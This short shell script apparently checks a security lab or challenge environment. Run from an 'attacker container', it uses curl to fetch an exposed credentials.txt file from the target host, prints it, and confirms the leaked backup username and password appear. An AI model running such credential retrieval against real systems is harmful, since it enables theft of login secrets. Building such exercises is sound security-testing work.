#!/bin/sh
# Runs in the attacker container; fetches the leaked backup credentials.
set -eu
body=$(curl -fsS "http://$BOX_HOST:8080/credentials.txt")
echo "$body"
echo "$body" | grep -q "${BOX_BACKUP_USER}" || { echo "leaked user missing" >&2; exit 1; }
echo "$body" | grep -q "${BOX_BACKUP_PASS}" || { echo "leaked password missing" >&2; exit 1; }
